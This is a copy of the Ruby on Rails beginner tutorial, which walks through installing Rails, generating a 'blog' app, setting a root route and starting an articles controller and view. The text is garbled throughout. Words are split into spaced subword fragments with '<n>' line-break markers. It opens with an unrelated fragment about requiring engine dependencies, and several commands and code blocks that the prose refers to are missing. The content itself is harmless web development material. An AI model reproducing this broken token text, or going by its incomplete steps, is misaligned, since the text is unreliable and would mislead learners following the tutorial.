▁Note ▁that ▁if ▁you ▁want ▁to ▁immediately ▁require ▁dependencies ▁when ▁the ▁engine ▁is < n > require d , ▁you ▁should ▁require ▁them ▁before ▁the ▁engine ' s ▁initialization .
▁For < n > example :
▁require ▁' other _ engine / engine '
▁require ▁' y et _ another _ engine / engine '
▁module ▁My Engine
▁ Getting ▁Start ed ▁with ▁Rails < n > ========== ================ < n >< n >
▁This ▁guide ▁cover s ▁getting ▁up ▁and ▁running ▁with ▁Ruby ▁on ▁Rails .
▁* ▁How ▁to ▁install ▁Rails , ▁create ▁a ▁new ▁Rails ▁application , ▁and ▁connect ▁your < n > ▁application ▁to ▁a ▁database .
▁* ▁The ▁general ▁layout ▁of ▁a ▁Rails ▁application .
▁* ▁The ▁basic ▁principle s ▁of ▁MVC ▁( Model , ▁View , ▁Controller ) ▁and ▁RESTful ▁design .
▁* ▁How ▁to ▁quickly ▁generate ▁the ▁starting ▁pieces ▁of ▁a ▁Rails ▁application .
▁G u id e ▁As sum p t ion s
▁This ▁guide ▁is ▁design ed ▁for ▁beginners ▁who ▁want ▁to ▁get ▁started ▁with ▁a ▁Rails < n > application ▁from ▁scratch .
▁It ▁does ▁not ▁assume ▁that ▁you ▁have ▁any ▁prior ▁experience < n > with ▁Rails .
▁However , ▁to ▁get ▁the ▁most ▁out ▁of ▁it , ▁you ▁need ▁to ▁have ▁some < n > prerequisites ▁installed :
▁To ▁learn ▁more ▁about ▁RubyGems , ▁please ▁read ▁the ▁[ Ruby G em s ▁G u id es ]( http :// guides . rubygems . org ).
▁Rails ▁is ▁a ▁web ▁application ▁framework ▁running ▁on ▁the ▁Ruby ▁programming ▁language .
▁If ▁you ▁have ▁no ▁prior ▁experience ▁with ▁Ruby , ▁you ▁will ▁find ▁a ▁very ▁ st eep ▁learning < n > c ur ve ▁ div ing ▁ str a ight ▁into ▁Rails .
▁There ▁are ▁sever al ▁c ur at ed ▁list s ▁of ▁online ▁resources < n > for ▁learning ▁Ruby :
▁* ▁[ O ff i cial ▁Ruby ▁ Programming ▁L an g u age ▁website ]( https :// www . ruby - lang . org / en / document ation / )
▁* ▁[ re S R C ' s ▁L ist ▁of ▁F re e ▁ Programming ▁ Book s ]( http :// re s r c . io / list / 10 / list - of - free - prog r am m ing - books / # ruby )
▁Be ▁a w a re ▁that ▁some ▁resources , ▁while ▁ still ▁excellent , ▁cover ▁versions ▁of ▁Ruby ▁as ▁old ▁as < n > 1 . 6 , ▁and ▁commonly ▁1. 8 , ▁and ▁will ▁not ▁include ▁some ▁syntax ▁that ▁you ▁will ▁see ▁in ▁day - to - day < n > development ▁with ▁Rails .
▁What ▁is ▁Rails ?
▁Rails ▁is ▁a ▁web ▁application ▁development ▁framework ▁written ▁in ▁the ▁Ruby ▁language .
▁It ▁is ▁design ed ▁to ▁make ▁programming ▁web ▁applications ▁easier ▁by ▁making ▁as sum p t ion s < n > about ▁what ▁every ▁developer ▁needs ▁to ▁get ▁started .
▁It ▁allows ▁you ▁to ▁write ▁less < n > code ▁while ▁accomplish ing ▁more ▁than ▁many ▁other ▁languages ▁and ▁frameworks .
▁ Experience d ▁Rails ▁developers ▁also ▁report ▁that ▁it ▁make s ▁web ▁application < n > development ▁more ▁f un .
▁Rails ▁is ▁ o p in ion at ed ▁software .
▁It ▁make s ▁the ▁as sum p t ion ▁that ▁there ▁is ▁the ▁" b est " < n > way ▁to ▁do ▁things , ▁and ▁it ' s ▁design ed ▁to ▁encourag e ▁that ▁way ▁- ▁and ▁in ▁some ▁cases ▁to < n > d is c our age ▁ alternative s .
▁If ▁you ▁learn ▁" The ▁Rails ▁Way " ▁you ' ll ▁ probably ▁ discover ▁a < n > tr em end ous ▁increase ▁in ▁ product i v ity .
▁If ▁you ▁persist ▁in ▁ br ing ing ▁old ▁habit s ▁from < n > other ▁languages ▁to ▁your ▁Rails ▁development , ▁and ▁try ing ▁to ▁use ▁pattern s ▁you < n > learned ▁else where , ▁you ▁may ▁have ▁a ▁less ▁h app y ▁experience .
▁The ▁Rails ▁ ph i lo so ph y ▁includes ▁two ▁major ▁ guid ing ▁principle s :
▁* ▁** Do n ' t ▁R epeat ▁Your self : ** ▁ DRY ▁is ▁a ▁principle ▁of ▁software ▁development ▁which < n > ▁state s ▁that ▁" E ve ry ▁piece ▁of ▁ knowledg e ▁must ▁have ▁a ▁single , ▁un am b ig u ous , ▁author it a tive < n > ▁representation ▁within ▁a ▁system . "
▁By ▁not ▁writing ▁the ▁same ▁information ▁over ▁and ▁over < n > ▁again , ▁our ▁code ▁is ▁more ▁maintain able , ▁more ▁ ext en s i b le , ▁and ▁less ▁bug g y .
▁* ▁** Co n v ent ion ▁Over ▁Configuration : ** ▁Rails ▁has ▁ o p in ion s ▁about ▁the ▁best ▁way ▁to ▁do ▁many < n > ▁things ▁in ▁a ▁web ▁application , ▁and ▁defaults ▁to ▁this ▁set ▁of ▁convention s , ▁rather ▁than < n > ▁require ▁that ▁you ▁specify ▁every ▁m in u t i a e ▁through ▁end less ▁configuration ▁files .
▁Creat ing ▁a ▁ New ▁Rails ▁ Pro j ec t
▁The ▁best ▁way ▁to ▁use ▁this ▁guide ▁is ▁to ▁follow ▁each ▁step ▁as ▁it ▁happens , ▁no ▁code ▁or < n > step ▁needed ▁to ▁make ▁this ▁example ▁application ▁has ▁been ▁left ▁out , ▁so ▁you ▁can < n > li ter ally ▁follow ▁along ▁step ▁by ▁step . < n >< n >
▁By ▁following ▁along ▁with ▁this ▁guide , ▁you ' ll ▁create ▁a ▁Rails ▁project ▁called < n >` blog `, ▁a ▁( ve ry ) ▁simple ▁we blog .
▁Before ▁you ▁can ▁start ▁build ing ▁the ▁application ,< n > you ▁need ▁to ▁make ▁sure ▁that ▁you ▁have ▁Rails ▁itself ▁installed .
▁TIP : ▁The ▁examples ▁below ▁use ▁` $ ` ▁to ▁represent ▁your ▁terminal ▁prompt ▁in ▁a ▁U N I X - like ▁OS ,< n > th ough ▁it ▁may ▁have ▁been ▁customize d ▁to ▁appear ▁different ly .
▁If ▁you ▁are ▁using ▁Windows ,< n > your ▁prompt ▁will ▁look ▁something ▁like ▁` c : \ source _ code >`
▁### ▁ Installing ▁Rails
▁Open ▁up ▁a ▁command ▁line ▁prompt .
▁On ▁Mac ▁OS ▁ X ▁open ▁T er m in al . app , ▁on ▁Windows ▁choose < n > " R un " ▁from ▁your ▁Start ▁menu ▁and ▁type ▁' c m d . ex e ' .
▁Any ▁commands ▁p ref ac ed ▁with ▁a < n > do ll ar ▁sign ▁` $ ` ▁should ▁be ▁run ▁in ▁the ▁command ▁line .
▁Verify ▁that ▁you ▁have ▁a < n > current ▁version ▁of ▁Ruby ▁installed :
▁ $ ▁ ruby ▁- v
▁ ruby ▁2 . 0 . 0 p 3 5 3
▁If ▁you ▁don ' t ▁have ▁Ruby ▁installed ▁have ▁a ▁look ▁at < n >[ ruby - lang . org ]( https :// www . ruby - lang . org / en / install ation / ) ▁for ▁possible ▁ways ▁to < n > install ▁Ruby ▁on ▁your ▁platform .
▁M any ▁popular ▁U N I X - like ▁OS es ▁ s h ip ▁with ▁an ▁accept able ▁version ▁of ▁SQLite 3 .
▁Verify ▁that ▁it ▁is ▁correctly ▁installed ▁and ▁in ▁your ▁P A T H :
▁ $ ▁ sqlite 3 ▁-- version
▁The ▁program ▁should ▁report ▁its ▁version .
▁To ▁install ▁Rails , ▁use ▁the ▁` gem ▁install ` ▁command ▁provided ▁by ▁RubyGems :
▁ $ ▁gem ▁install ▁rails
▁To ▁verify ▁that ▁you ▁have ▁everything ▁installed ▁correctly , ▁you ▁should ▁be ▁able ▁to < n > ru n ▁the ▁following :
▁ $ ▁rails ▁-- version
▁### ▁Creat ing ▁the ▁B log ▁Application
▁Rails ▁comes ▁with ▁a ▁number ▁of ▁ script s ▁called ▁generator s ▁that ▁are ▁design ed ▁to ▁make < n > your ▁development ▁life ▁easier ▁by ▁creating ▁everything ▁that ' s ▁necessary ▁to ▁start < n > working ▁on ▁a ▁particular ▁task .
▁One ▁of ▁these ▁is ▁the ▁new ▁application ▁generator ,< n > which ▁will ▁provide ▁you ▁with ▁the ▁foundation ▁of ▁a ▁fresh ▁Rails ▁application ▁so ▁that < n > you ▁don ' t ▁have ▁to ▁write ▁it ▁yourself .
▁To ▁use ▁this ▁generator , ▁open ▁a ▁terminal , ▁navigate ▁to ▁a ▁directory ▁where ▁you ▁have < n > right s ▁to ▁create ▁files , ▁and ▁type :
▁ $ ▁rails ▁new ▁blog
▁This ▁will ▁create ▁a ▁Rails ▁application ▁called ▁B log ▁in ▁a ▁` blog ` ▁directory ▁and < n > install ▁the ▁gem ▁dependencies ▁that ▁are ▁already ▁mentioned ▁in ▁` Gemfile ` ▁using < n >` bundle ▁install `.
▁TIP : ▁You ▁can ▁see ▁all ▁of ▁the ▁command ▁line ▁options ▁that ▁the ▁Rails ▁application < n > builder ▁accept s ▁by ▁running ▁` rails ▁new ▁- h `.
▁After ▁you ▁create ▁the ▁blog ▁application , ▁switch ▁to ▁its ▁folder :
▁ $ ▁ cd ▁blog
▁The ▁` blog ` ▁directory ▁has ▁a ▁number ▁of ▁ auto - generated ▁files ▁and ▁folder s ▁that ▁make < n > up ▁the ▁structure ▁of ▁a ▁Rails ▁application .
▁ Most ▁of ▁the ▁work ▁in ▁this ▁tutorial ▁will < n > h app en ▁in ▁the ▁` app ` ▁folder , ▁but ▁here ' s ▁a ▁basic ▁run d own ▁on ▁the ▁function ▁of ▁each < n > of ▁the ▁files ▁and ▁folder s ▁that ▁Rails ▁created ▁by ▁default :
▁| ▁File / F ol d er ▁| ▁P urpose ▁|
▁| app / | Co n t a in s ▁the ▁controllers , ▁models , ▁views , ▁helpers , ▁mailer s ▁and ▁assets ▁for ▁your ▁application .
▁You ' ll ▁focus ▁on ▁this ▁folder ▁for ▁the ▁remain d er ▁of ▁this ▁guide .
▁| config / | Co n figure ▁your ▁application ' s ▁routes , ▁database , ▁and ▁more .
▁This ▁is ▁covered ▁in ▁more ▁detail ▁in ▁[ Co n fig ur ing ▁Rails ▁Application s ]( configuring . html ).
▁| config . ru | Rack ▁configuration ▁for ▁Rack ▁base d ▁server s ▁used ▁to ▁start ▁the ▁application .
▁| db / | Co n t a in s ▁your ▁current ▁database ▁ schema , ▁as ▁well ▁as ▁the ▁database ▁migrations .
▁| Gemfile < br > Gemfile . lock | The se ▁files ▁allow ▁you ▁to ▁specify ▁what ▁gem ▁dependencies ▁are ▁needed ▁for ▁your ▁Rails ▁application .
▁These ▁files ▁are ▁used ▁by ▁the ▁Bundler ▁gem .
▁| lib / | Ex t end ed ▁module s ▁for ▁your ▁application .
▁| log / | Application ▁log ▁files .
▁| public / | The ▁only ▁folder ▁seen ▁by ▁the ▁world ▁as - is .
▁Co n t a in s ▁static ▁files ▁and ▁ compiled ▁assets .
▁| R a k e file | This ▁file ▁ lo cat es ▁and ▁load s ▁task s ▁that ▁can ▁be ▁run ▁from ▁the ▁command ▁line .
▁The ▁task ▁definition s ▁are ▁defined ▁throughout ▁the ▁components ▁of ▁Rails .
▁R ather ▁than ▁changing ▁Rake file , ▁you ▁should ▁add ▁your ▁own ▁task s ▁by ▁adding ▁files ▁to ▁the ▁ lib / t as k s ▁directory ▁of ▁your ▁application .
▁| README . rdoc | This ▁is ▁a ▁brief ▁instruct ion ▁m an u al ▁for ▁your ▁application .
▁You ▁should ▁edit ▁this ▁file ▁to ▁tell ▁other s ▁what ▁your ▁application ▁does , ▁how ▁to ▁set ▁it ▁up , ▁and ▁so ▁on .
▁| test / | U n it ▁tests , ▁fixtures , ▁and ▁other ▁test ▁app ar at us .
▁These ▁are ▁covered ▁in ▁[ Test ing ▁Rails ▁Application s ]( test ing . html ).
▁| t mp / | T e mp or ary ▁files ▁( like ▁cache , ▁p id , ▁and ▁session ▁files ).
▁| vendor / | A ▁place ▁for ▁all ▁third - part y ▁code .
▁In ▁a ▁typical ▁Rails ▁application ▁this ▁includes ▁ vendor ed ▁gems .
▁ Hello , ▁Rails !
▁To ▁begin ▁with , ▁let ' s ▁get ▁some ▁text ▁up ▁on ▁screen ▁quickly .
▁To ▁do ▁this , ▁you ▁need ▁to < n > get ▁your ▁Rails ▁application ▁server ▁running .
▁### ▁Start ing ▁up ▁the ▁Web ▁ Server
▁You ▁actually ▁have ▁a ▁functional ▁Rails ▁application ▁already .
▁To ▁see ▁it , ▁you ▁need ▁to < n > start ▁a ▁web ▁server ▁on ▁your ▁development ▁machine .
▁You ▁can ▁do ▁this ▁by ▁running ▁the < n > following ▁in ▁the ▁` blog ` ▁directory :
▁U s u ally ▁Mac ▁OS ▁ X ▁and ▁Windows ▁come ▁with ▁a ▁JavaScript ▁runtime ▁installed . < n >
▁Rails ▁add s ▁the ▁` the ruby r ac er ` ▁gem ▁to ▁the ▁generated ▁` Gemfile ` ▁in ▁a < n > comment ed ▁line ▁for ▁new ▁app s ▁and ▁you ▁can ▁uncomment ▁if ▁you ▁need ▁it . < n >
▁` the ruby r h in o ` ▁is ▁the ▁recommended ▁runtime ▁for ▁JRuby ▁users ▁and ▁is ▁added ▁by < n > default ▁to ▁the ▁` Gemfile ` ▁in ▁app s ▁generated ▁under ▁JRuby .
▁This ▁will ▁fire ▁up ▁WEBrick , ▁a ▁web ▁server ▁d ist r i but ed ▁with ▁Ruby ▁by ▁default .
▁To ▁see < n > your ▁application ▁in ▁action , ▁open ▁a ▁browser ▁window ▁and ▁navigate ▁to < n >< http :// localhost : 3 000 > .
▁You ▁should ▁see ▁the ▁Rails ▁default ▁information ▁page :
▁ Welcome ▁a board ▁screen s h o t ]( images / getting _ started / rails _ welcome . png )
▁TIP : ▁To ▁stop ▁the ▁web ▁server , ▁hit ▁ Ctrl + C ▁in ▁the ▁terminal ▁window ▁where ▁it ' s < n > running .
▁To ▁verify ▁the ▁server ▁has ▁stop ped ▁you ▁should ▁see ▁your ▁command ▁prompt < n > c ur s or ▁again .
▁For ▁most ▁U N I X - like ▁systems ▁including ▁Mac ▁OS ▁ X ▁this ▁will ▁be ▁a < n > do ll ar ▁sign ▁` $ `.
▁In ▁development ▁mode , ▁Rails ▁does ▁not ▁generally ▁require ▁you ▁to < n > re start ▁the ▁server ; ▁changes ▁you ▁make ▁in ▁files ▁will ▁be ▁automatically ▁ pick ed ▁up ▁by < n > the ▁server .
▁The ▁" Welcome ▁a board " ▁page ▁is ▁the ▁ _ s m o k e ▁test _ ▁for ▁a ▁new ▁Rails ▁application : ▁it < n > make s ▁sure ▁that ▁you ▁have ▁your ▁software ▁configured ▁correctly ▁enough ▁to ▁serve ▁a < n > page .
▁You ▁can ▁also ▁click ▁on ▁the ▁ _ About ▁your ▁application ' s ▁environment _ ▁link ▁to < n > see ▁a ▁summary ▁of ▁your ▁application ' s ▁environment .
▁### ▁S a y ▁" Hello ", ▁Rails
▁To ▁get ▁Rails ▁say ing ▁" Hello ", ▁you ▁need ▁to ▁create ▁at ▁minimum ▁a ▁ _ controller _ ▁and ▁a < n > _ view _ .
▁A ▁controller ' s ▁purpose ▁is ▁to ▁receive ▁specific ▁requests ▁for ▁the ▁application . < n >
▁ _ Routing _ ▁decide s ▁which ▁controller ▁receive s ▁which ▁requests .
▁Of t en , ▁there ▁is ▁more < n > th an ▁one ▁route ▁to ▁each ▁controller , ▁and ▁different ▁routes ▁can ▁be ▁served ▁by < n > different ▁ _ action s _ .
▁ Each ▁action ' s ▁purpose ▁is ▁to ▁collect ▁information ▁to ▁provide < n > it ▁to ▁a ▁view .
▁A ▁view ' s ▁purpose ▁is ▁to ▁display ▁this ▁information ▁in ▁a ▁human ▁read able ▁format .
▁An < n > import ant ▁ distinct ion ▁to ▁make ▁is ▁that ▁it ▁is ▁the ▁ _ controller _ , ▁not ▁the ▁view ,< n > where ▁information ▁is ▁collect ed .
▁The ▁view ▁should ▁just ▁display ▁that ▁information . < n >
▁By ▁default , ▁view ▁templates ▁are ▁written ▁in ▁a ▁language ▁called ▁e Ruby ▁( Embedded < n > Ruby ) ▁which ▁is ▁processed ▁by ▁the ▁request ▁cycle ▁in ▁Rails ▁before ▁being ▁sent ▁to ▁the < n > user .
▁To ▁create ▁a ▁new ▁controller , ▁you ▁will ▁need ▁to ▁run ▁the ▁" controller " ▁generator ▁and < n > t e ll ▁it ▁you ▁want ▁a ▁controller ▁called ▁" welcome " ▁with ▁an ▁action ▁called ▁" index ", < n > j us t ▁like ▁this :
▁Rails ▁will ▁create ▁sever al ▁files ▁and ▁a ▁route ▁for ▁you .
▁create ▁app / controllers / welcome _ controller . rb
▁get ▁' welcome / index '
▁create ▁app / views / welcome
▁create ▁app / views / welcome / index . html . erb
▁create ▁test / controllers / welcome _ controller _ test . rb
▁create ▁app / helpers / welcome _ helper . rb
▁invoke ▁ coffee
▁create ▁app / assets / javascripts / welcome . js . coffee
▁invoke ▁ scss
▁create ▁app / assets / stylesheets / welcome . css . scss
▁ Most ▁important ▁of ▁these ▁are ▁of ▁course ▁the ▁controller , ▁located ▁at < n >` app / controllers / welcome _ controller . rb ` ▁and ▁the ▁view , ▁located ▁at < n >` app / views / welcome / index . html . erb `.
▁Open ▁the ▁` app / views / welcome / index . html . erb ` ▁file ▁in ▁your ▁text ▁editor .
▁Delet e ▁all < n > of ▁the ▁existing ▁code ▁in ▁the ▁file , ▁and ▁replace ▁it ▁with ▁the ▁following ▁single ▁line < n > of ▁code :
▁< h 1> Hello , ▁Rails !
▁### ▁Setting ▁the ▁Application ▁Home ▁P age
▁Now ▁that ▁we ▁have ▁made ▁the ▁controller ▁and ▁view , ▁we ▁need ▁to ▁tell ▁Rails ▁when ▁we < n > w ant ▁" Hello , ▁Rails !" ▁to ▁show ▁up .
▁In ▁our ▁case , ▁we ▁want ▁it ▁to ▁show ▁up ▁when ▁we < n > nav ig ate ▁to ▁the ▁root ▁URL ▁of ▁our ▁site , ▁< http :// localhost : 3 000 > .
▁At ▁the ▁moment ,< n > " Welcome ▁a board " ▁is ▁ o cc up ying ▁that ▁spot .
▁Next , ▁you ▁have ▁to ▁tell ▁Rails ▁where ▁your ▁actual ▁home ▁page ▁is ▁located .
▁Open ▁the ▁file ▁` config / routes . rb ` ▁in ▁your ▁editor .
▁# ▁The ▁prior ity ▁is ▁base d ▁upon ▁order ▁of ▁creation :
▁# ▁first ▁created ▁-> ▁high est ▁prior ity .
▁< n > ▁#< n >
▁# ▁You ▁can ▁have ▁the ▁root ▁of ▁your ▁site ▁route d ▁with ▁" root "
▁# ▁root ▁' welcome # index '
▁This ▁is ▁your ▁application ' s ▁ _ routing ▁file _ ▁which ▁hold s ▁ en tries ▁in ▁a ▁special ▁D S L < n > ( domain - specific ▁language ) ▁that ▁tell s ▁Rails ▁how ▁to ▁connect ▁in com ing ▁requests ▁to < n > controllers ▁and ▁actions .
▁This ▁file ▁contains ▁many ▁sample ▁routes ▁on ▁comment ed < n > line s , ▁and ▁one ▁of ▁them ▁actually ▁shows ▁you ▁how ▁to ▁connect ▁the ▁root ▁of ▁your ▁site < n > to ▁a ▁specific ▁controller ▁and ▁action .
▁Find ▁the ▁line ▁beginning ▁with ▁` root ` ▁and < n > un comment ▁it .
▁It ▁should ▁look ▁something ▁like ▁the ▁following :
▁root ▁' welcome # index '
▁` root ▁' welcome # index ' ` ▁tell s ▁Rails ▁to ▁map ▁requests ▁to ▁the ▁root ▁of ▁the < n > application ▁to ▁the ▁ welcome ▁controller ' s ▁index ▁action ▁and ▁` get ▁' welcome / index ' `< n > t e ll s ▁Rails ▁to ▁map ▁requests ▁to ▁< http :// localhost :3000/ welcome / index > ▁to ▁the < n > welcome ▁controller ' s ▁index ▁action .
▁You ' ll ▁see ▁the < n > " Hello , ▁Rails !" ▁message ▁you ▁put ▁into ▁` app / views / welcome / index . html . erb `, < n > indicat ing ▁that ▁this ▁new ▁route ▁is ▁in de ed ▁going ▁to ▁` Welcome Controller ` ' s ▁` index `< n > action ▁and ▁is ▁rendering ▁the ▁view ▁correctly .
▁TIP : ▁For ▁more ▁information ▁about ▁routing , ▁refer ▁to ▁[ Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In ]( routing . html ).
▁ Getting ▁U p ▁and ▁Running
▁Now ▁that ▁you ' ve ▁seen ▁how ▁to ▁create ▁a ▁controller , ▁an ▁action ▁and ▁a ▁view , ▁let ' s < n > create ▁something ▁with ▁a ▁bit ▁more ▁substan ce .
▁In ▁the ▁B log ▁application , ▁you ▁will ▁now ▁create ▁a ▁new ▁ _ resource _ .
▁A ▁resource ▁is ▁the < n > ter m ▁used ▁for ▁a ▁collection ▁of ▁similar ▁objects , ▁such ▁as ▁articles , ▁people ▁or < n > an i m al s .
▁You ▁can ▁create , ▁read , ▁update ▁and ▁destroy ▁items ▁for ▁a ▁resource ▁and ▁these < n > o p er ation s ▁are ▁ referred ▁to ▁as ▁ _ C R U D _ ▁operations .
▁Rails ▁provides ▁a ▁` resources ` ▁method ▁which ▁can ▁be ▁used ▁to ▁declare ▁a ▁standard ▁REST < n > resource .
▁root ▁' welcome # index '
▁The ▁meaning ▁of ▁the ▁prefix ▁column ▁( and ▁other ▁columns )< n > will ▁be ▁seen ▁later , ▁but ▁for ▁now ▁notice ▁that ▁Rails ▁has ▁inferred ▁the < n > s ing ul ar ▁form ▁` article ` ▁and ▁make s ▁meaning ful ▁use ▁of ▁the ▁ distinct ion .
▁P ref i x ▁Verb ▁U R I ▁ Pattern ▁Controller # Action
▁articles ▁GET ▁/ articles ( . : format ) ▁articles # index
▁POST ▁/ articles ( . : format ) ▁articles # create
▁edit _ article ▁GET ▁/ articles / : id / edit ( . : format ) ▁articles # edit
▁article ▁GET ▁/ articles / : id ( . : format ) ▁articles # show
▁ PATCH ▁/ articles / : id ( . : format ) ▁articles # update
▁ PUT ▁/ articles / : id ( . : format ) ▁articles # update
▁DELETE ▁/ articles / : id ( . : format ) ▁articles # destroy
▁root ▁GET ▁/ ▁ welcome # index
▁In ▁the ▁next ▁section , ▁you ▁will ▁add ▁the ▁ability ▁to ▁create ▁new ▁articles ▁in ▁your < n > application ▁and ▁be ▁able ▁to ▁view ▁them .
▁This ▁is ▁the ▁" C " ▁and ▁the ▁" R " ▁from ▁CRUD : < n > c re ation ▁and ▁reading .
▁The ▁form ▁for ▁doing ▁this ▁will ▁look ▁like ▁this :
▁The ▁new ▁article ▁form ]( images / getting _ started / new _ article . png )
▁It ▁will ▁look ▁a ▁little ▁basic ▁for ▁now , ▁but ▁that ' s ▁ o k .
▁We ' ll ▁look ▁at ▁i mprov ing ▁the < n > st y l ing ▁for ▁it ▁after w ar d s .
▁### ▁L a ying ▁down ▁the ▁ ground ▁work
▁First ly , ▁you ▁need ▁a ▁place ▁within ▁the ▁application ▁to ▁create ▁a ▁new ▁article .
▁A < n > g re at ▁place ▁for ▁that ▁would ▁be ▁at ▁` / articles / new `.
▁With ▁the ▁route ▁already < n > defined , ▁requests ▁can ▁now ▁be ▁made ▁to ▁` / articles / new ` ▁in ▁the ▁application . < n >
▁N a v ig ate ▁to ▁< http :// localhost :3000/ articles / new > ▁and ▁you ' ll ▁see ▁a ▁routing < n > error :
▁A nother ▁routing ▁error , ▁un initialize d ▁constant ▁Article sController ]( images / getting _ started / routing _ error _ no _ controller . png )
▁This ▁error ▁occur s ▁because ▁the ▁route ▁needs ▁to ▁have ▁a ▁controller ▁defined ▁in ▁order < n > to ▁serve ▁the ▁request .
▁The ▁solution ▁to ▁this ▁particular ▁problem ▁is ▁simple : ▁create < n > a ▁controller ▁called ▁` Article sController `.
▁You ▁can ▁do ▁this ▁by ▁running ▁this < n > command :
▁If ▁you ▁open ▁up ▁the ▁new ly ▁generated ▁` app / controllers / articles _ controller . rb `< n > you ' ll ▁see ▁a ▁fai r ly ▁empty ▁controller :
▁class ▁Article sController ▁< ▁Application Controller
▁A ▁controller ▁is ▁simply ▁a ▁class ▁that ▁is ▁defined ▁to ▁inherit ▁from < n >` Application Controller `. < n >
▁It ' s ▁inside ▁this ▁class ▁that ▁you ' ll ▁define ▁methods ▁that ▁will ▁become ▁the ▁actions < n > for ▁this ▁controller .
▁These ▁actions ▁will ▁perform ▁CRUD ▁operations ▁on ▁the ▁articles < n > with in ▁our ▁system .
▁NOTE : ▁There ▁are ▁` public `, ▁` private ` ▁and ▁` protected ` ▁methods ▁in ▁Ruby ,< n > but ▁only ▁` public ` ▁methods ▁can ▁be ▁actions ▁for ▁controllers . < n >
▁For ▁more ▁details ▁check ▁out ▁[ Programming ▁Ruby ]( http :// www . ruby - doc . org / doc s / Programming Ruby / ).
▁If ▁you ▁refresh ▁< http :// localhost :3000/ articles / new > ▁now , ▁you ' ll ▁get ▁a ▁new ▁error :
▁Un k now n ▁action ▁new ▁for ▁Article sController ! ](
▁This ▁error ▁indicates ▁that ▁Rails ▁cannot ▁find ▁the ▁` new ` ▁action ▁inside ▁the < n >` Article sController ` ▁that ▁you ▁just ▁generated .
▁This ▁is ▁because ▁when ▁controllers < n > a re ▁generated ▁in ▁Rails ▁they ▁are ▁empty ▁by ▁default , ▁unless ▁you ▁tell ▁it < n > your ▁want ed ▁actions ▁during ▁the ▁generation ▁process .
▁To ▁manually ▁define ▁an ▁action ▁inside ▁a ▁controller , ▁all ▁you ▁need ▁to ▁do ▁is ▁to < n > define ▁a ▁new ▁method ▁inside ▁the ▁controller .
▁def ▁new
▁With ▁the ▁` new ` ▁method ▁defined ▁in ▁` Article sController `, ▁if ▁you ▁refresh < n >< http :// localhost :3000/ articles / new > ▁you ' ll ▁see ▁another ▁error :
▁You ' re ▁getting ▁this ▁error ▁now ▁because ▁Rails ▁expect s ▁plain ▁actions ▁like ▁this ▁one < n > to ▁have ▁views ▁ associated ▁with ▁them ▁to ▁display ▁their ▁information .
▁With ▁no ▁view < n > available , ▁Rails ▁errors ▁out .
▁In ▁the ▁above ▁image , ▁the ▁bottom ▁line ▁has ▁been ▁ truncate d .
▁Let ' s ▁see ▁what ▁the ▁full < n > th ing ▁look s ▁like :
▁ Missing ▁template ▁articles / new , ▁application / new ▁with ▁ { locale : [: en ] , ▁format s : [: html ] , ▁handle r s : [: erb , ▁: builder , ▁: coffee ]} .
▁S e ar ch ed ▁in : ▁* ▁" / path / to / blog / app / views "
▁That ' s ▁quite ▁a ▁lot ▁of ▁text !
▁Let ' s ▁quickly ▁go ▁through ▁and ▁understand ▁what ▁each < n > part ▁of ▁it ▁does .
▁The ▁first ▁part ▁identifie s ▁what ▁template ▁is ▁missing .
▁In ▁this ▁case , ▁it ' s ▁the < n >` articles / new ` ▁template .
▁Rails ▁will ▁first ▁look ▁for ▁this ▁template .
▁If ▁not ▁found ,< n > the n ▁it ▁will ▁attempt ▁to ▁load ▁a ▁template ▁called ▁` application / new `.
▁It ▁look s ▁for < n > one ▁here ▁because ▁the ▁` Article sController ` ▁inherit s ▁from ▁` Application Controller `.
▁The ▁next ▁part ▁of ▁the ▁message ▁contains ▁a ▁hash .
▁The ▁`: locale ` ▁key ▁in ▁this ▁hash < n > s i mp ly ▁indicates ▁what ▁sp o k en ▁language ▁template ▁should ▁be ▁retrieved .
▁By ▁default ,< n > this ▁is ▁the ▁English ▁- ▁or ▁" en " ▁- ▁template .
▁The ▁next ▁key , ▁`: format s ` ▁specifie s ▁the < n > format ▁of ▁template ▁to ▁be ▁served ▁in ▁response .
▁The ▁default ▁format ▁is ▁`: html `, ▁and < n > so ▁Rails ▁is ▁look ing ▁for ▁an ▁HTML ▁template .
▁The ▁final ▁key , ▁`: h and ler s `, ▁is ▁tell ing < n > us ▁what ▁ _ template ▁handle r s _ ▁could ▁be ▁used ▁to ▁render ▁our ▁template . ▁`: erb ` ▁is ▁most < n > common ly ▁used ▁for ▁HTML ▁templates , ▁`: builder ` ▁is ▁used ▁for ▁ X ML ▁templates , ▁and < n >`: coffee ` ▁uses ▁CoffeeScript ▁to ▁build ▁JavaScript ▁templates .
▁The ▁final ▁part ▁of ▁this ▁message ▁tell s ▁us ▁where ▁Rails ▁has ▁look ed ▁for ▁the ▁templates . < n >
▁ Template s ▁within ▁a ▁basic ▁Rails ▁application ▁like ▁this ▁are ▁ k e p t ▁in ▁a ▁single < n > location , ▁but ▁in ▁more ▁complex ▁applications ▁it ▁could ▁be ▁many ▁different ▁paths .
▁The ▁simplest ▁template ▁that ▁would ▁work ▁in ▁this ▁case ▁would ▁be ▁one ▁located ▁at < n >` app / views / articles / new . html . erb `.
▁The ▁extension ▁of ▁this ▁file ▁name ▁is ▁key : ▁the < n > first ▁extension ▁is ▁the ▁ _ format _ ▁of ▁the ▁template , ▁and ▁the ▁second ▁extension ▁is ▁the < n > _ h and ler _ ▁that ▁will ▁be ▁used .
▁Rails ▁is ▁attempt ing ▁to ▁find ▁a ▁template ▁called < n >` articles / new ` ▁within ▁` app / views ` ▁for ▁the ▁application .
▁The ▁format ▁for ▁this < n > template ▁can ▁only ▁be ▁` html ` ▁and ▁the ▁handle r ▁must ▁be ▁one ▁of ▁` erb `, ▁` builder ` ▁or < n >` coffee `.
▁Because ▁you ▁want ▁to ▁create ▁a ▁new ▁HTML ▁form , ▁you ▁will ▁be ▁using ▁the ▁` ER B `< n > language .
▁There for e ▁the ▁file ▁should ▁be ▁called ▁` articles / new . html . erb ` ▁and ▁needs < n > to ▁be ▁located ▁inside ▁the ▁` app / views ` ▁directory ▁of ▁the ▁application .
▁G o ▁a head ▁now ▁and ▁create ▁a ▁new ▁file ▁at ▁` app / views / articles / new . html . erb ` ▁and < n > write ▁this ▁content ▁in ▁it :
▁< h 1> New ▁Article </ h 1>
▁When ▁you ▁refresh ▁< http :// localhost :3000/ articles / new > ▁you ' ll ▁now ▁see ▁that ▁the < n > page ▁has ▁a ▁title .
▁The ▁route , ▁controller , ▁action ▁and ▁view ▁are ▁now ▁working < n > ha rm on ious ly !
